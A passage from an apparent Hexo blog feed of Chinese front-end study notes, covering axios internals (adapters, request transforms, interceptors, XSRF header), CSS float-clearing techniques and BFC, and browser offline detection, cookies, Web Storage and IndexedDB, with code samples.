operator">===</span> <span class="token string">'[object process]'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// For node use HTTP adapter</span>  adapter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./adapters/http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> XMLHttpRequest <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// For browsers use XHR adapter</span>  adapter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./adapters/xhr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> adapter<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>请求前数据类型的检测及转换<pre class=" language-javascript"><code class="language-javascript">transformRequest<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token function">transformRequest</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> headers<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">normalizeHeaderName</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> <span class="token string">'Accept'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">normalizeHeaderName</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> <span class="token string">'Content-Type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>utils<span class="token punctuation">.</span><span class="token function">isFormData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">||</span>  utils<span class="token punctuation">.</span><span class="token function">isArrayBuffer</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">||</span>  utils<span class="token punctuation">.</span><span class="token function">isBuffer</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">||</span>  utils<span class="token punctuation">.</span><span class="token function">isStream</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">||</span>  utils<span class="token punctuation">.</span><span class="token function">isFile</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">||</span>  utils<span class="token punctuation">.</span><span class="token function">isBlob</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>utils<span class="token punctuation">.</span><span class="token function">isArrayBufferView</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> data<span class="token punctuation">.</span>buffer<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>utils<span class="token punctuation">.</span><span class="token function">isURLSearchParams</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setContentTypeIfUnset</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> data<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>utils<span class="token punctuation">.</span><span class="token function">isObject</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setContentTypeIfUnset</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> <span class="token string">'application/json;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span></code></pre></li><li>默认resolve的状态码验证<pre class=" language-javascript"><code class="language-javascript">validateStatus<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token function">validateStatus</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul></li><li>core中定义了一个Axios的类，有接口暴露，用户可以定义类继承<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Axios</span><span class="token punctuation">(</span>instanceConfig<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>defaults <span class="token operator">=</span> instanceConfig<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>interceptors <span class="token operator">=</span> <span class="token punctuation">{</span>  request<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">InterceptorManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  response<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">InterceptorManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>拦截器添加和删除<pre class=" language-javascript"><code class="language-javascript">InterceptorManager<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>use <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">use</span><span class="token punctuation">(</span>fulfilled<span class="token punctuation">,</span> rejected<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  fulfilled<span class="token punctuation">:</span> fulfilled<span class="token punctuation">,</span>  rejected<span class="token punctuation">:</span> rejected<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>InterceptorManager<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>eject <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">eject</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>handlers<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li><li>core/settle.js：resolve及reject处理<pre class=" language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">settle</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">,</span> response<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> validateStatus <span class="token operator">=</span> response<span class="token punctuation">.</span>config<span class="token punctuation">.</span>validateStatus<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>validateStatus <span class="token operator">||</span> <span class="token function">validateStatus</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">resolve</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token function">reject</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span>    <span class="token string">'Request failed with status code '</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>status<span class="token punctuation">,</span>    response<span class="token punctuation">.</span>config<span class="token punctuation">,</span>    <span class="token keyword">null</span><span class="token punctuation">,</span>    response<span class="token punctuation">.</span>request<span class="token punctuation">,</span>    response  <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li></ul></li><li>adapter中针对node.js和浏览器环境，封装http和xhr提供请求<ul><li>xhr:添加xsrf验<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Add xsrf header</span><span class="token comment" spellcheck="true">// This is only done if running in a standard browser environment.</span><span class="token comment" spellcheck="true">// Specifically not if we're in a web worker, or react-native.</span><span class="token keyword">if</span> <span class="token punctuation">(</span>utils<span class="token punctuation">.</span><span class="token function">isStandardBrowserEnv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> cookies <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./../helpers/cookies'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Add xsrf header</span><span class="token keyword">var</span> xsrfValue <span class="token operator">=</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>withCredentials <span class="token operator">||</span> <span class="token function">isURLSameOrigin</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> config<span class="token punctuation">.</span>xsrfCookieName <span class="token operator">?</span>  cookies<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>xsrfCookieName<span class="token punctuation">)</span> <span class="token punctuation">:</span>  undefined<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>xsrfValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>  requestHeaders<span class="token punctuation">[</span>config<span class="token punctuation">.</span>xsrfHeaderName<span class="token punctuation">]</span> <span class="token operator">=</span> xsrfValue<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>promise封装<pre class=" language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">xhrAdapter</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">dispatchXhrRequest</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">settle</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> axios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>清除浮动方法总结</title>
      <link href="/2018/09/13/qing-chu-fu-dong-fang-fa-zong-jie/"/>
      <url>/2018/09/13/qing-chu-fu-dong-fang-fa-zong-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://segmentfault.com/a/1190000004865198" target="_blank" rel="noopener">CSS-清除浮动</a></li></ul><h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><p>当容器的高度自适应，且容器的内容中有浮动的元素，在这种情况下，容器的高度不能自动伸长以适应内容的高度，使得内容溢出到容器外面而影响（甚至破坏）布局的现象。这个现象叫浮动溢出，为了防止这个现象的出现而进行的CSS处理，就叫CSS清除浮动。</p><h4 id="空div法"><a href="#空div法" class="headerlink" title="空div法"></a>空div法</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//在浮动元素后添加一个空标签</span><span class="token punctuation">.</span>clearfix <span class="token punctuation">{</span>  clear<span class="token punctuation">:</span> both<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>优点：简单、代码少、浏览器兼容性好</li><li>缺点：添加无语义的HTML元素，代码不够优雅<h4 id="设置高度"><a href="#设置高度" class="headerlink" title="设置高度"></a>设置高度</h4>如果父级元素高度能够确定，给浮动元素父级设置高度</li></ul><h4 id="利用伪元素"><a href="#利用伪元素" class="headerlink" title="利用伪元素"></a>利用伪元素</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">.</span>clearfix<span class="token punctuation">:</span>after <span class="token punctuation">{</span>  content<span class="token punctuation">:</span> <span class="token string">"\20"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加一个看不见的点或者空格</span>  display<span class="token punctuation">:</span> block<span class="token punctuation">;</span>  height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  clear<span class="token punctuation">:</span> both<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//清除浮动</span><span class="token punctuation">}</span><span class="token punctuation">.</span>clearfix <span class="token punctuation">{</span>  <span class="token operator">*</span>zoom<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//zoom这个属性是ie专有属性，除了设置或者检索对象的缩放比例之外，它还有可以触发IE6,IE7的haslayout属性，清除浮动，清除margin重叠等作用。</span><span class="token punctuation">}</span></code></pre><h4 id="BFC布局"><a href="#BFC布局" class="headerlink" title="BFC布局"></a>BFC布局</h4><ul><li>定义：块格式化上下文（Block Formatting Context，BFC） 是Web页面的可视化CSS渲染的一部分，是布局过程中生成块级盒子的区域，也是浮动元素与其他元素的交互限定区域。</li><li>特性<ul><li>内部的box会在垂直方向，从顶部开始一个接着一个地放置</li><li>box 垂直方向的距离由margin(外边距)决定。属于同一个BFC的两个相邻box的margin会发生叠加(例子所提到的盒子margin合并问题)</li><li>BFC的区域不会与float box叠加</li><li>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素，反之亦然</li><li>计算BFC高度时，浮动元素也参与计算</li><li>每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此</li></ul></li><li>触发<ul><li>根元素或其它包含它的元素；</li><li>浮动 (元素的float不为none)；</li><li>绝对定位元素 (元素的position为absolute或fixed)；</li><li>行内块inline-blocks(元素的 display: inline-block)；</li><li>表格单元格(元素的display: table-cell，HTML表格单元格默认属性)；</li><li>overflow的值不为visible的元素；</li><li>弹性盒 flex boxes (元素的display: flex或inline-flex)；</li></ul></li><li>BFC的一个最重要的效果是，让处于BFC内部的元素与外部的元素相互隔离，使内外元素的定位不会相互影响。这是利用BFC清除浮动所利用的特性</li><li>可以通过设置父级元素<code>overflow:auto</code>来清除浮动</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>离线应用与客户端存储</title>
      <link href="/2018/09/12/chi-xian-ying-yong-yu-ke-hu-duan-cun-chu/"/>
      <url>/2018/09/12/chi-xian-ying-yong-yu-ke-hu-duan-cun-chu/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://juejin.im/post/5aede266f265da0ba266e0ef" target="_blank" rel="noopener">cookie和session</a><br><a href="https://juejin.im/entry/5ac4d661f265da23a049c92a" target="_blank" rel="noopener">细说localStorage, sessionStorage, Cookie, Session</a></p><h4 id="离线检测"><a href="#离线检测" class="headerlink" title="离线检测"></a>离线检测</h4><ul><li>支持离线Web应用开发是HTML5的另一个重点</li><li>HTML5定义了一个<code>navigator.onLine</code>属性，这个属性值为<code>true</code>表示设备能上网，值为<code>false</code>表示设备离线</li><li>当网络从离线变为在线/从在线变为离线触发事件：<pre class=" language-javascript"><code class="language-javascript">EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">"online"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//handle</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>EventUtil<span class="token punctuation">.</span><span class="token function">addHandler</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token string">"offline"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//handle</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="应用缓存"><a href="#应用缓存" class="headerlink" title="应用缓存"></a>应用缓存</h4></li><li>HTML5的应用缓存appcache是专门为开发离线Web应用而设计的，Appcache就是从浏览器的缓存中分出来的一块缓存区，可以用一个描述文件（manifest.file）列出要下载和缓存的资源，一个示例：<pre class=" language-bash"><code class="language-bash">CACHE MANIFEST<span class="token comment" spellcheck="true">#Comment</span>file.jsfile.css</code></pre></li><li>关联文件与页面<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span>  <span class="token attr-name">manifest</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/offline.manifest<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre></li></ul><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><ul><li>构成<ul><li>名称：唯一确定的，不区分大小写</li><li>值：储存在cookie中的字符串值，值必须被URL编码</li><li>域：cookie对于哪个域是有效的;Domain</li><li>路径：对于指定域中的路径;Path</li><li>失效时间：表示cookie应该合适删除的时间戳，默认情况下浏览器会话结束时即将所有cookie删除；自己设置删除时间GMT格式的日期；expires/Max-Age</li><li>安全标志：制定后，cookie只有在使用SSL连接时才发送到服务器;Secure;</li><li>限制：客户端无法更改Cookie，客户端设置cookie时不能使用这个参数，一般是服务器端使用；HttpOnly</li></ul></li><li>设置cookie响应报文示例：<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 0KContent-type: text/htmlSet-Cookie: name<span class="token operator">=</span>value<span class="token punctuation">;</span> expires<span class="token operator">=</span>Mon, 22-Jan-07 07:10:24 GMT<span class="token punctuation">;</span>domain<span class="token operator">=</span>.wrox.com<span class="token punctuation">;</span>secure<span class="token punctuation">;</span>path<span class="token operator">=</span>/other<span class="token operator">=</span>header: other-header-value</code></pre></li></ul><h4 id="Cookie与Session"><a href="#Cookie与Session" class="headerlink" title="Cookie与Session"></a>Cookie与Session</h4><ul><li>http协议的无状态：HTTP是一种无状态协议，无状态指的是服务端对于客户端每次发送的请求都认为它是一个新的请求，上次会话和下次会话没有关系；也就是说在一个连接中，客户端可以向服务端发送多次请求，但是各个请求之间没有什么联系；</li><li>持久连接：<ul><li>HTTP/1.0的<code>keep-alive</code>：每次发送一个HTTP请求会附带一个<code>connection:keep-alive</code>声明一个持久连接</li><li>HTTP/1.1的<code>persistent</code>：持久连接是默认开启的，只有首部中包含<code>connection:close</code>，才会事务结束后关闭连接</li></ul></li><li>session是在无状态的HTTP下，服务端记录用户状态用与标识具体用户的机制。它是在服务端保存的用来跟踪用户的状态的而数据结构，可以保存在文件、数据库或者集群中；</li><li><strong>cookie和session机制</strong>：当服务器收到请求需要创建session对象时，首先会检查客户端请求中是否包含sessionid。如果有sessionid，服务器将根据该id返回对应session对象。如果客户端请求中没有sessionid，服务器会创建新的session对象，并把sessionid在本次响应中通过<code>Set-Cookie</code>的头部字段，在本地客户端设置一个cookie；当用户再次访问服务器的时候，http请求报文会附带cookie发送，cookie中保存sessionID信息来标识是否属于同一次会话；如果用户禁用cookie，则要使用URL重写，可以通过response.encodeURL(url) 进行实现；API对encodeURL的结束为，当浏览器支持Cookie时，url不做任何处理；当浏览器不支持Cookie的时候，将会重写URL将SessionID拼接到访问地址后</li><li>cookie是客户端保存状态；session是以服务端保存状态；</li></ul><h4 id="Web存储机制"><a href="#Web存储机制" class="headerlink" title="Web存储机制"></a>Web存储机制</h4><ul><li>Storage类型：提供最大的存储空间来存储名值对<ul><li>方法：<ul><li><code>getItem(name)</code></li><li><code>key(index)</code></li><li><code>removeItem(name)</code></li><li><code>setItem(name, value)</code></li></ul></li></ul></li><li>sessionStorage 对象：存储特定某个会话的数据，也就是该数据只保存到浏览器关闭</li><li>globalStorage 对象：跨越会话存储数据，但是有访问限制；使用时需要指定可访问的域<pre class=" language-javascript"><code class="language-javascript">globalStorage<span class="token punctuation">[</span><span class="token string">"wrox.com"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Nicholas"</span><span class="token punctuation">;</span><span class="token keyword">var</span> name <span class="token operator">=</span> globalStorage<span class="token punctuation">[</span><span class="token string">"wrox.com"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>globalStorage<span class="token punctuation">[</span>location<span class="token punctuation">.</span>host<span class="token punctuation">]</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Nicholas"</span><span class="token punctuation">;</span></code></pre></li><li>localStorage 对象：要访问同一个localStorage对象，页面必须来袭同一个域名（子域名无效）<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getLocalStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> localStorage <span class="token operator">==</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> localStorage<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> globalStorage <span class="token operator">==</span> <span class="token string">"object"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> globalStorage<span class="token punctuation">[</span>location<span class="token punctuation">.</span>host<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Local storage not available."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h4 id="区分"><a href="#区分" class="headerlink" title="区分"></a>区分</h4><ul><li>localStorage 和 sessionStorage<ul><li>共同点：存储一般为5M；受同源策略限制；仅在客户端保存，不参与和服务器的通信；</li><li>生命周期：localStorage存储的数据是永久性的，除非人为删除；sessionStorage存储的数据与标签页有效期是相同的，窗口或者标签页关闭就会删除；</li><li>作用域：localStorage同一浏览器的同源文档之间共享数据；sessionStorage同一浏览器的同一窗口的同源文档之间共享数据</li></ul></li></ul><h4 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h4><ul><li>在浏览器中保存结构化数据的一种数据库，支持查询和搜索</li><li>打开数据库例子：<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> request<span class="token punctuation">,</span> database<span class="token punctuation">;</span>request <span class="token operator">=</span> indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>request<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"something bad hanppened while trying to oprn: "</span> <span class="token operator">+</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>errorCode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>request<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>  database <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>设定版本号<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span>database<span class="token punctuation">.</span>version <span class="token operator">!=</span> <span class="token string">"1.0"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  request <span class="token operator">=</span> database<span class="token punctuation">.</span><span class="token function">setVersion</span><span class="token punctuation">(</span><span class="token string">"1.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span>onerror <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"something bad happened while trying to set version:"</span> <span class="token operator">+</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>errorCode<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  requset<span class="token punctuation">.</span>onsuccess <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Database initialization complete. Database name: "</span> <span class="token operator">+</span> database<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">", Version: "</span> <span class="token operator">+</span> database<span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Database already initialized. Database name: "</span> <span class="token operator">+</span> database<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">", Version: "</span> <span class="token operator">+</span> database<span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>对象存储空间<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> store <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>keyPath<span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> users<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//users中保存着一批用户对象</span><span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>  store<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>users<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>事务<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//只载入users存储空间中的数据</span><span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 访问多个存储空间</span><span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">,</span> <span class="token string">"anotherStore"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 默认为只读方式访问数据，要修改访问方式，需传入第二个参数</span><span class="token keyword">var</span> IDBTransaction <span class="token operator">=</span> window<span class="token punctuation">.</span>IDBTransaction <span class="token operator">||</span> window<span class="token punctuation">.</span>webkitIDBTransaction<span class="token punctuation">;</span><span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">,</span> IDBTransaction<span class="token punctuation">.</span>READ_WRITE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 事务请求</span><span class="token keyword">var</span> request <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">)</span><span class="token 